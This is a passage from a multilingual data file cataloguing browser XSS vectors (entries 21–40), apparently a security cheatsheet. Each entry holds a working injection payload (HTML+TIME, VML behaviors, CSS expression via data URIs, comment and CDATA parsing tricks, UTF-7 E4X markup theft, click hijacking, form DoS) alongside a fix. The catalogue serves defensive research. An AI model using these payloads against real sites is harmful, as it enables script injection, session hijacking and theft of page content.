        },
        'urls'    : ['https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Functions/ReferenceError'],
        'howtofix'   : {
            'en' : 'Do not trust the DOM in case the user can influence it via script injections, includes or other DOM based property access.',
            'ja' : '',
            'ru' : 'Не доверяйте DOM в случае, если пользователь может повлиять на неё через инъекции, включения JavaScript или другой доступ к свойствам, основанный на DOM.',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['8.x', '9.x', '10.x'], 
            'firefox' : ['1.x', '2.x', '3.x'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0'],
            'safari': ['4.x']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'xml', 'css'],
        'reporter'   : '.mario'
    },
    { /* ID 21 - JavaScript execution via proprietary __noSuchMethod__  */
        'id'         : 21,
        'category'   : 'javascript', 
        'name'       : {
            'en' : 'JavaScript execution via proprietary __noSuchMethod__',
            'ja' : '',
            'ru' : 'Выполнение JavaScript с помощью нестандарного свойства __noSuchMethod__',
            'de' : ''
        },
        'data'       : '<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._(\'%js_alert%\')()</script>',
        'description': {
            'en' : 'Firefox supports the non-standard __noSuchMethod__ property which will be used as an interceptor as soon as a non existing object method is being called. It can be assigned with the Function object to force JavaScript execution without using function(){...}.',
            'ja' : '',
            'ru' : 'Firefox поддерживает нестандартное свойство __noSuchMethod__ , которое может использоваться в качестве перехватчика, когда вызывается несуществующий объект. В качестве такового может быть назначен объект Function, чтобы инициировать исполнение JavaScript без использовавания function(){...} .',
            'de' : ''
        },
        'urls'    : ['https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Object/noSuchMethod'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },          
        'browsers'   : {
            'firefox' : ['3.5', '3.6', '3.7'] 
        },
        'tags'       : ['xss', 'javascript', 'firefox', '__noSuchMethod__', 'proprietary'],
        'reporter'   : 'Gareth, .mario'
    },
    { /* ID 22 - Input stealing/form DoS with onblur=focus() and autofocus  */
        'id'         : 22,
        'category'   : 'dos', 
        'name'       : {
            'en' : 'Input stealing/form DoS with onblur=focus() and autofocus',
            'ja' : '',
            'ru' : 'Перехват ввода/DoS формы посредством onblur=focus() и autofocus',
            'de' : ''
        },
        'data'       : '<input onblur=%js_focus% autofocus><input>',
        'description': {
            'en' : 'This very basic vector demonstrates how the combination of "autofocus" and "onblur" can render any other form on the targeted website useless.',
            'ja' : '',
            'ru' : 'Этот очень простой вектор показывает, как сочетание autofocus и onblur может сделать любую другую форму на целевом сайте бесполезной.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602'],
        'howtofix'   : {
            'en' : 'User submitted markup should not contain "autofocus" attributes.',
            'ja' : '',
            'ru' : 'Пользовательская разметка не должна содержать атрибут autofocus.',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['8.x', '9.x', '10.x'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0']
        },
        'tags'       : ['dos', 'javascript', 'opera', 'chrome', 'autofocus', 'onblur', 'html5'],
        'reporter'   : 'Skyphire, Gareth, .mario'
    },
    { /* ID 23 - Form surveillance with onformchange, onforminput and form attributes  */
        'id'         : 23,
        'category'   : 'html5', 
        'name'       : {
            'en' : 'Form surveillance with onformchange, onforminput and form attributes',
            'ja' : '',
            'ru' : 'Наблюдение за формой с помощью атрибутов onformchange, onforminput и form',
            'de' : ''
        },
        'data'       : '<form id=test onforminput=%js_alert%><input></form><button form=test onformchange=%js_alert_2%>X',
        'description': {
            'en' : 'Enter a value into the form element to see how "onforminput" and "onformchange" attributes can monitor <FORM> activity - even from outside the <FORM> via the form attribute on a <BUTTON> element.',
            'ja' : '',
            'ru' : 'Введите значение в элемент формы, чтобы увидеть, как атрибуты onforminput и onformchange могут контролировать активность в теге <FORM> даже за пределами этого тега с помощью атрибута form тега <button> .',
            'de' : ''
        },
        'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#broadcast-formchange-events'],
        'howtofix'   : {
            'en' : 'Make sure users cannot submit markup including the form, "onformchange" and "onforminput" attributes. Do not apply <FORM> elements with an "id" attribute.',
            'ja' : '',
            'ru' : 'Убедитесь, что пользовательский ввод не может содержать атрибуты onformchange, onforminput и form. Избегайте атрибут id в теге <FORM>.',
            'de' : ''
        },                        
        'browsers'   : {
            'opera' : ['10.5', '10.6', 'mobile'] 
        },
        'tags'       : ['surveillance', 'javascript', 'opera', 'html5', 'onforminput', 'onformchange'],
        'reporter'   : 'Skyphire, .mario'
    },
    { /* ID 24 - JavaScript execution via HTML+TIME without user interaction (1) */
        'id'         : 24,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'JavaScript execution via HTML+TIME without user interaction (1)',
            'ja' : '',
            'ru' : 'Активный скриптинг с применением технологии HTML+TIME (1)',
            'de' : ''
        },
        'data'       : '1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=%js_alert%&gt;`>',
        'description': {
            'en' : 'This obfuscated vector uses HTML+TIME to execute JavaScript without user interaction - and without suspicious event handlers but just "attributename" and "to" attributes.',
            'ja' : '',
            'ru' : 'Этот слегка обфусцированный вектор использует HTML+TIME для исполнения JavaScript без взаимодействия с пользователем и без подозрительных обработчиков событий исключительно с помощью атрибутов attributename и to. ',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags. The rather unknown HTML+TIME API provides too many ways to execute JavaScript with and without user interaction on exotic ways. Avoid blacklists if possible.',
            'ja' : '',
            'ru' : 'Не разрешайте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки в отношении опасных HTML-тегов. Малоизвестные HTML+TIME API предоставляют довольно много экзотических способов исполнения JavaScript, в т.ч. без взаимодействия с пользователем. Избегайте черных списков, если это возможно.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'ie', 'behavior', 'html+time', 'attributename', 'to', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 25 - Self-including E4X-based JavaScript snippet  */
        'id'         : 25,
        'category'   : 'e4x', 
        'name'       : {
            'en' : 'Self-including E4X-based JavaScript snippet',
            'ja' : '',
            'ru' : 'Самовключаемый JavaScript фрагмент, основанный на E4X',
            'de' : ''
        },
        'data'       : '<script src="#">{%js_alert%}</script>;1',
        'description': {
            'en' : 'This <SCRIPT> tag tries to include the very same page it is being executed from - and then executes the {}-delimited E4X payload. To avoid having Firefox throw an error during inclusion the ending sequence ;0 is necessary.',
            'ja' : '',
            'ru' : 'Этот тег <SCRIPT> пытается использовать ту же самую страницу в качестве своего содержимого. Если содержимое страницы правильно с точки зрения XML-синтаксиса, она будет разобрана в JavaScript в качестве E4X-строки. При этом произойдет выполнение полезной нагрузки, содержащейся внутри E4X-разделителя - {}. Чтобы избежать возможную ошибку во время включения, необходимо окончание в виде ;0 и т.п.',
            'de' : ''
        },
        'urls'    : ['https://developer.mozilla.org/en/E4X'],
        'howtofix'   : {
            'en' : 'E4X is extremely dangerous since any page can include sources providing valid XML and the mentioned semi-colon delimiter. For effective protection websites must be applied with a DOCTYPE - or contain invalid markup. There are many variations for the ending delimiter - as long it is valid JavaScript and not indicating the page is XML only it will work (;1, ,1, ._, etc..)',
            'ja' : '',
            'ru' : 'E4X является чрезвычайно опасным, если исходный код страницы является правильным с т.зр. XML и содержит разделители в виде точек с запятой. Для эффективной защиты сайты должны применять DOCTYPE или содержать неправильную разметку. Существует много вариантов для оканчивающего разделителя: если это правильный JavaScript, и страница не является исключительно XML, то будут работать ";1", ",1", "._" и т.д.',
            'de' : ''
        },            
        'browsers'   : {
            'firefox' : ['1.5', '2.x', '3.x']
        },
        'tags'       : ['xss', 'javascript', 'firefox', 'e4x', 'self-inclusion', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 26 - E4X-based UTF7 JavaScript snippet stealing cross-domain markup  */
        'id'         : 26,
        'category'   : 'e4x', 
        'name'       : {
            'en' : 'E4X-based UTF7 JavaScript/HTML snippet stealing cross-domain markup',
            'ja' : '',
            'ru' : 'Кодированный UTF7 JavaScript/HTML фрагмент на основе E4X для междоменного доступа к разметке',
            'de' : ''
        },
        'data'       : '+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);',
        'description': {
            'en' : 'In case an attacker can inject the character sequence beginning with .toXMLString() it\'s possible to include the victimized website in a <SCRIPT> tag loaded from an arbitrary page and steal the markup of the included page - across domain and protocol borders. Note that the whole vector is encoded in UTF7. This is possible since the including <SCRIPT> tag can decide via charset attribute what charset to use.',
            'ja' : '',
            'ru' : 'В случае, если атакующий может внедрить последовательность символов, начинающихся с .toXMLString(), существует возможность включения уязвимого сайта в качестве содержимого тега <SCRIPT>, запускаемого с удаленной страницы, с последующим присвоением разметки включенной страницы независимо от протокола и домена. Обратите внимание, что весь вектор кодируется в UTF7. Это возможно, поскольку в теге <SCRIPT> можно указать кодировку с помощью атрибута charset.',
            'de' : ''
        },
        'urls'    : ['https://developer.mozilla.org/en/E4X'],
        'howtofix'   : {
            'en' : 'Make sure all sites are being applied with a defined charset like UTF-8. Also incoming data should be converted from UTF-7 before being escaped with htmlentities() or comparable methods. All websites containing sensitive data should be applied with a DOCTYPE.',
            'ja' : '',
            'ru' : 'Убедитесь, что ко всем страницам применяется определенная UTF-8 кодировка. Кроме того, входящие данные должны быть преобразованы из UTF-7, прежде чем будут обработаны с помощью htmlentities() или похожих методов. Все страницы, содержащие конфиденциальные данные, должны использовать DOCTYPE.',
            'de' : ''
        },            
        'browsers'   : {
            'firefox' : ['1.5', '2.x', '3.x']
        },
        'tags'       : ['xss', 'javascript', 'firefox', 'e4x', 'stealing', 'utf7', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 27 - Opera whole-page click hijacking via CSS  */
        'id'         : 27,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Opera whole-page click hijacking via CSS',
            'ja' : '',
            'ru' : 'Перехват нажатия на любом элементе страницы с помощью CSS для Opera',
            'de' : ''
        },
        'data'       : '<style>p[foo=bar{}*{-o-link:\'%js_uri_alert%\'}{}*{-o-link-source:current}]{color:red};</style>',
        'description': {
            'en' : 'Opera as well as other browsers allow to break out attribute selectors and other CSS constructs with {...} - opening the possibility for declaring new properties and assigning values - such as -o-link and -o-link-source. In this case those proprietary properties allow overlaying any selected element with a JavaScript URI link href.',
            'ja' : '',
            'ru' : 'Opera, как и другие браузеры, допускают выход за пределы селектора и других CSS-конструкций с помощью {...}, что открывает возможность для декларирования новых свойств и их значений, создавая видимость продолжения селектора.',
            'de' : ''
        },
        'urls'    : ['http://www.aptana.com/reference/html/api/CSS.field.-o-link-source.html'],
        'howtofix'   : {
            'en' : 'In case users are allowed to submit CSS make sure the properties allowed are whitelisted and attribute selector content does not allow the combination {...} because it breaks out the attribute selector and allows declaration of new properties.',
            'ja' : '',
            'ru' : 'В случае, если пользователи имеют возможность изменять CSS, убедитесь, что свойства занесены в "белый список", а селекторы не содержат сочетание {...} .',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['8.x', '9.x', '10.x', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'css', 'opera', 'attribute selectors', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 28 - JavaScript execution via HTML+TIME without user interaction (2)  */
        'id'         : 28,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'JavaScript execution via HTML+TIME without user interaction (2)',
            'ja' : '',
            'ru' : 'Активный скриптинг с применением технологии HTML+TIME (2)  ',
            'de' : ''
        },
        'data'       : '1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=%js_alert%&gt;>',
        'description': {
            'en' : 'This HTML+TIME vector utilized the attributes "attributename" and "values" to map ecoded markup into an attribute to execute JavaScript.',
            'ja' : '',
            'ru' : 'Этот HTML+TIME вектор использует атрибуты attributename и values для изменения значения свойства innerHTML у анимируемого объекта. Нужно иметь в виду, что посредством тегов set и animate можно менять и другие свойства объектов (например, src или href). Отличие animate от set состоит в том, что анимировать возможно только то свойство, которое уже имеет начальное значение. Если свойство не имеет начальное значение, то можно прибегнуть к использованию сочетания атрибутов from и to в теге animate. Также не стоит упускать возможность указать целевой тег для анимирования в атрибуте targetElement.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'As soon as the HTML+TIME namespace and the behavior property are mapped to a HTML element a whole range of new attributes to execute JavaScript is available. In user submitted html "xmlns" attributes should not be allowed - as well as "behavior" properties for style tags and attribtes. Don\'t rely on blacklisting when dealing with user submitted markup.',
            'ja' : '',
            'ru' : 'Как только пространство имен и поведение HTML+TIME привязаны к HTML-элементу, становятся доступными целый ряд новых атрибутов, с помощью которых возможно выполнение JavaScript. В пользовательской разметке не должно быть разрешено использование атрибута xmlns, а также свойств поведений в стилях. Избегайте черных списков при работе с пользовательской разметкой.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'behavior', 'style', 'html+time', 'attributename', 'values', 'proprietary'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 29 - JavaScript execution via <LINK> href attribute and data URI  */
        'id'         : 29,
        'category'   : 'css', 
        'name'       : {
            'en' : 'JavaScript execution via <LINK> href attribute and data URI',
            'ja' : '',
            'ru' : 'Выполнение JavaScript с помощью атрибута href и data URI в теге <LINK>',
            'de' : ''
        },
        'data'       : '<link rel=stylesheet href=data:,*%7bx:expression(%js_write%)%7d',
        'description': {
            'en' : 'Despite the existing documentation Internet Explorer 8 supports data URIs not only for displaying images but also supplying stylesheet information. This can be used to wrap expression() CSS into a data URI and execute JavaScript with a <LINK> tag.',
            'ja' : '',
            'ru' : 'Несмотря на имеющуюся документацию Internet Explorer 8 поддерживает схему data URI не только для вывода изображений, но также и для представления стилевой информации. Это может быть использовано для сокрытия expression() внутри data URI и вызова Javascript в теге <LINK>.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure stylesheet URIs cannot be controlled by the user - and user submitted  <LINK> tags will not be displayed unfiltered.',
            'ja' : '',
            'ru' : 'Убедитесь, что стилевые URI не могут быть в полной мере подконтрольны пользователю, а пользовательские теги LINK не выводятся неотфильтрованными.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'ie', 'css', 'style', 'expression', 'datauri', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 30 - JavaScript execution via <STYLE> @import and data URI  */
        'id'         : 30,
        'category'   : 'css', 
        'name'       : {
            'en' : 'JavaScript execution via <STYLE> @import and data URI',
            'ja' : 'Выполнение JavaScript с помощью @import и data URI в теге <STYLE>',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<style>@import "data:,*%7bx:expression(%js_write%)%7D";</style>',
        'description': {
            'en' : 'Despite the existing documentation Internet Explorer 8 supports data URIs not only for displaying images but also supplying stylesheet information. This can be used to wrap expression() CSS into a data URI and execute JavaScript with a <STYLE> @import directive.',
            'ja' : '',
            'ru' : 'Несмотря на имеющуюся документацию Internet Explorer 8 поддерживает схему data URI не только для вывода изображений, но также и для представления стилевой информации. Это может быть использовано для сокрытия expression() внутри data URI и вызова Javascript c помощью директивы @import тега <STYLE>.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms530768%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Make sure stylesheet URIs cannot be controlled by the user - and user submitted  <STYLE> cannot contain the @import directive.',
            'ja' : '',
            'ru' : 'Убедитесь, что стилевые URI не могут быть в полной мере подконтрольны пользователю, а пользовательские стили не содержат директиву @import.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'ie', 'css', 'style', 'expression', 'datauri', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 31 - JavaScript execution via <FRAMESET> and onload  */
        'id'         : 31,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via <FRAMESET> and onload',
            'ja' : '',
            'ru' : 'Выполнение JavaScript с помощью <FRAMESET> и onload',
            'de' : ''
        },
        'data'       : '<frameset onload=%js_alert%>',
        'description': {
            'en' : 'This classic vector shows that several tags don\'t need a "src" attribute to fire onload events, such as <IFRAME>, <BODY> and <FRAMESET>.',
            'ja' : '',
            'ru' : 'Этот классический вектор демонстрирует, что некоторые теги (такие как <IFRAME>, <BODY> и <FRAMESET>) не требуют атрибута src для запуска обработчика onload.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Be sure to work with whitelists when allowing users to submit markup - else ancient tags like <FRAMESET> might be forgotten to filter and escape.',
            'ja' : '',
            'ru' : 'Убедитесь, что работаете с белым списком, когда принимаете пользовательскую разметку, в ином случае такие устаревшие теги как <FRAMESET> могут быть упущены из внимания при фильтрации.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0'],
            'opera': ['8.x', '9.x', '10.x', 'mobile'], 
            'firefox' : ['1.x', '2.x', '3.x'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0'],
            'safari': ['3.0', '4.0']
        },
        'tags'       : ['xss', 'javascript', 'frames', 'classic', 'html', 'onload'],
        'reporter'   : '.mario'
    },
    { /* ID 32 - JavaScript execution via <TABLE> and background  */
        'id'         : 32,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via <TABLE> and background',
            'ja' : '',
            'ru' : 'Выполнение JavaScript с помощью <TABLE> и background',
            'de' : ''
        },
        'data'       : '<table background="javascript:%js_alert%">',
        'description': {
            'en' : 'Opera 8-10.5+ as well as Internet Explorer 6 support JavaScript URIs for <TABLE> and some other tags\' "background" attributes. This causes JavaScript execution without user interaction.',
            'ja' : '',
            'ru' : 'Opera 8-10.5+ , а также Internet Explorer 6 поддерживает псевдоскрипт в теге <TABLE> и некоторых других тегах в атрибуте background. Это порождает возможность выполнения JavaScript без участия пользователя.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'In case evil attributes like event handlers are being filtered from user submitted markup make sure not to forget "background" - among others.',
            'ja' : '',
            'ru' : 'Убедитесь, что при фильтрации пользовательской разметки среди прочих не забыт и атрибут background.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['6.0'],
            'opera': ['8.x', '9.x', '10.x', 'mobile'] 
        },
        'tags'       : ['xss', 'javascript', 'background', 'classic', 'html', 'table'],
        'reporter'   : '.mario'
    },
    { /* ID 33 - Breaking pointer-events:none with nested links  */
        'id'         : 33,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Breaking pointer-events:none with nested links',
            'ja' : '',
            'ru' : 'Прерывание pointer-events:none вложенной ссылкой',
            'de' : ''
        },
        'data'       : '<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="%js_alert%;">XXX</a></a><a href="%js_uri_alert_2%">XXX</a>',
        'description': {
            'en' : 'Firefox 3.6+ allows using CSS "pointer-events"  with value "none" to make sure an element will not react on any mouse/pointer based event. This feature enables for example placing a DIV over another DIV without blocking the click events addressed to the underlying DIV.',
            'ja' : '',
            'ru' : 'Firefox 3.6+ позволяет использовать CSS-свойство pointer-events со значением none, чтобы элемент не реагировал на какие-либо события указателей. Это свойство позволяет, например, позиционировать элемент DIV поверх другого DIV без блокировки событий нажатия, адресованных первому.',
            'de' : ''
        },
        'urls'    : ['http://hacks.mozilla.org/2009/12/pointer-events-for-html-in-firefox-3-6/'],
        'howtofix'   : {
            'en' : 'The feature breaks as soon as <A> elements are being used in combination with "pointer-events:none" - containing other <A> elements. <A> elements should not be used for pointer-event logic at all - especially not when containing user controlled HTML.',
            'ja' : '',
            'ru' : 'Свойство прерывается, как только элемент <A>, используемый в сочетании с pointer-events:none, содержит другой элемент <A>. Элементы <A> не должны использоваться в логике pointer-events в целом, и в особенности тогда, когда они могут содержать контролируемую пользователем разметку.',
            'de' : ''
        },            
        'browsers'   : {
            'firefox': ['3.6', '3.7'] 
        },
        'tags'       : ['xss', 'hijacking', 'css', 'pointer-events', 'firefox'],
        'reporter'   : '.mario'
    },
    { /* ID 34 - VML frame with embedded VML object plus onmouseover  */
        'id'         : 34,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'VML frame with embedded VML object plus onmouseover',
            'ja' : '',
            'ru' : 'VML фрейм с помещенным в него VML объектом плюс onmouseover',
            'de' : ''
        },
        'data'       : '<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%vml_path%#xss></vmlframe>',
        'attachment' : {
            'required_mime' : '',
            'samedomain'    : '0',            
            'path'          : '',
            'name'          : 'test.vml',
            'raw'           : '<xml>\r\n\t<rect style="height:100%;width:100%" id="xss" onmouseover="%js_alert%" strokecolor="white" strokeweight="2000px" filled="false" />\r\n</xml>'
        },
        'description': {
            'en' : 'A VML frame object works by giving the VML frame a "src" attribute and have it point to another VML object. A VML frame object in quirks mode can enclose a VML rect object or regular HTML which is responding to mouseover events.',
            'ja' : '',
            'ru' : 'Объект VML фрейма ссылается в атрибуте src на другой VML объект, который реагирует на событие движения мышью. В режиме совместимости VML фрейм может непосредственно заключать в себе VML rect объект или обычный HTML.', 
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/bb263900%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags.',
            'ja' : '',
            'ru' : 'Не разрешайте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки опасных HTML тегов.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0'] 
        },
        'tags'       : ['xss', 'javascript', 'style', 'behavior', 'vml', 'internet explorer', 'proprietary'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 35 - VML line object utilizing href attribute with JavaScript URI   */
        'id'         : 35,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'VML line object utilizing href attribute with JavaScript URI',
            'ja' : '',
            'ru' : 'VML объект line использует атрибут href c псевдоскриптом.',
            'de' : ''
        },
        'data'       : '1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=%js_uri_alert% strokecolor=white strokeweight=1000px from=0 to=1000 /></a>',
        'description': {
            'en' : 'The vector paints a very thick and wide line responding to clicks with JavaScript execution via JavaScript URI. Note that the actual URI is being masked in the status bar. During an overlay attack the victim will not know about the payload via status bar.',
            'ja' : '',
            'ru' : 'Данный вектор рисует очень длинную и широкую линию, нажатие на которую приведет к исполнению JavaScript. Обратите внимание, что псевдоскрипт маскируется в статусной строке, поэтому потерпевший не будет знать об истинной полезной нагрузке. Такой же эффект имеет место и в остальных графических VML тегах.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/bb229513%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags.',
            'ja' : '',
            'ru' : 'Не разрешайте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки опасных HTML тегов.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0'] 
        },
        'tags'       : ['xss', 'javascript', 'style', 'behavior', 'vml', 'internet explorer', 'proprietary'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 36 - AnchorClick behavior enabling folder attribute as href replacement  */
        'id'         : 36,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'AnchorClick behavior enabling folder attribute as href replacement',
            'ja' : '',
            'ru' : 'Поведение AnchorClick',
            'de' : ''
        },
        'data'       : '<a style="behavior:url(#default#AnchorClick);" folder="%js_uri_alert%">XXX</a>',
        'description': {
            'en' : 'Using the AnchorClick behavior allows to use the "folder" attribute as replacement for a "href" attribute on <A> elements.',
            'ja' : '',
            'ru' : 'Использование поведения AnchorClick позволяет заменить в теге <A> атрибут href атрибутом folder, содержащим полезную нагрузку.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms531414%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags.',
            'ja' : '',
            'ru' : 'Не разрешайте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки опасных HTML тегов.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0'] 
        },
        'tags'       : ['xss', 'javascript', 'style', 'behavior', 'anchorclick', 'internet explorer', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 37 - HTML comment parsing issues (1)  */
        'id'         : 37,
        'category'   : 'html', 
        'name'       : {
            'en' : 'HTML comment parsing issues (1)',
            'ja' : '',
            'ru' : 'Разбор комментариев в HTML (1)',
            'de' : ''
        },
        'data'       : '<!--<img src="--><img src=x onerror=%js_alert%//">',
        'description': {
            'en' : 'This vector shows how comments are being parsed and what problems can arise in case user submitted HTML is allowed to contain comments.',
            'ja' : '',
            'ru' : 'Этот пример показывает, как в настоящее время разбираются комментарии, и какие проблемы могут возникнуть в случае, если пользовательская разметка может содержать комментарии.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure comments are not allowed in user submitted html. The markup should be checked for security issues after comments have been stripped out - not before.',
            'ja' : '',
            'ru' : 'Убедитесь, что комментарии не разрешены в пользовательской разметке. Разметка должна проверяться для целей безопасности только после удаления комментариев, но не до того.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0'],
            'opera': ['8.x', '9.x', '10.x', 'mobile'], 
            'firefox' : ['1.x', '2.x', '3.x'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0'],
            'safari': ['3.0', '4.0']
        },
        'tags'       : ['xss', 'javascript', 'comment', 'parsing', 'attributes'],
        'reporter'   : 'sdc, .mario'
    },
    { /* ID 38 - HTML comment parsing issues (2)  */
        'id'         : 38,
        'category'   : 'html', 
        'name'       : {
            'en' : 'HTML comment parsing issues (2)',
            'ja' : '',
            'ru' : 'Разбор комментариев в HTML (2)',
            'de' : ''
        },
        'data'       : '<comment><img src="</comment><img src=x onerror=%js_alert%)//">',
        'description': {
            'en' : 'Besides <!---> the Internet Explorer allows to use <COMMENT> tags. The vector shows how comments are being parsed and what problems can arise in case user submitted HTML is allowed to contain comments.',
            'ja' : '',
            'ru' : 'Вместо <!---> Internet Explorer разрешает использовать тег <COMMENT>. Этот пример также показывает, как разбираются комментарии, и какие проблемы могут возникнуть в случае, если пользовательская разметка может их содержать.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure <COMMENT> tags are not allowed in user submitted html. The markup should be checked for security issues after <COMMENT> tags have been stripped out or escaped - not before. ',
            'ja' : '',
            'ru' : 'Убедитесь, что тег <COMMENT> не разрешен в пользовательской разметке. Разметка должна проверяться для целей безопасности только после удаления тегов <COMMENT>.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'comment', 'parsing', 'attributes'],
        'reporter'   : '.mario'
    },
    { /* ID 39 - CDATA section parsing issues  */
        'id'         : 39,
        'category'   : 'html', 
        'name'       : {
            'en' : 'CDATA section parsing issues',
            'ja' : '',
            'ru' : 'Разбор CDATA-секций',
            'de' : ''
        },
        'data'       : '<![><img src="]><img src=x onerror=%js_alert%//">',
        'description': {
            'en' : 'Firefox and Opera allow using CDATA section delimiters in HTML - in the stripped form "<![" as well as including padding like "<![CDATA[". This can cause problems for filter mechanisms since those delimiters can be used for massive obfuscation.',
            'ja' : '',
            'ru' : 'Firefox и Opera разрешают использовать разделители CDATA-секций в HTML. В сокращенной форме "<![" то же самое, что и "<![CDATA[". Это может породить проблемы для механизма фильтрации, поскольку эти разделители могут быть использованы для обфускации.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure CDATA delimiters are not allowed in user submitted html. The markup should be checked for security issues after CDATA sections nd delimiters have been stripped out or escaped - not before.',
            'ja' : '',
            'ru' : 'Убедитесь, что CDATA-разделители не разрешены в пользовательской разметке. Разметка должна проверяться для целей безопасности только после удаления CDATA-секций.',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['8.x', '9.x', '10.x', 'mobile'], 
            'firefox' : ['1.x', '2.x', '3.x']
        },
        'tags'       : ['xss', 'javascript', 'cdata', 'parsing', 'attributes'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 40 - Plaintext tags used for markup obfuscation  */
        'id'         : 40,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Plaintext tags used for markup obfuscation',
            'ja' : '',
            'ru' : 'Текстовые теги, используемые для обфускации разметки',
            'de' : ''
        },
